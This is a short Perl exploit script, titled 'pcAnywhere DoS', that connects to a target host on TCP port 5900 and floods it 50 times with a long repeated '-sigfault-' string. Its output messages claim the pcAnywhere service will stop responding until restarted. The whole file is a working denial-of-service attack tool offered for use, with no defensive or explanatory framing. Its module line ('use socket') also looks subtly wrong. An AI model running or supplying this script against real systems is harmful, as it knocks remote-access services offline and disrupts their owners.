#!/usr/bin/perl -w

# pcAnywhere DoS

use socket;

my $port = "5900";
print "\npcAnywhere DoS";
if(! $ARGV[0]){
print "\nusage: ./$0 <host>\n\a";
exit;
}else{
my $host = $ARGV[0];
my $iaddr = inet_aton($host);
my $proto = getprotobyname('tcp');
my $paddr =sockaddr_in($port, $iaddr);
socket(DOS,AF_INET,SOCK_STREAM,$proto) || die "\ncant make socket";
connect(DOS,$paddr) || die "\nCan't connect";
print "\nConnected...Sending DoS";
my $denial = "-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-sigfault-";
for(1..50){
syswrite(DOS,$denial,length($denial));
 }
}
print "\nDoS finished";
print "\npcAnywhere will stop responding til restarted";
exit;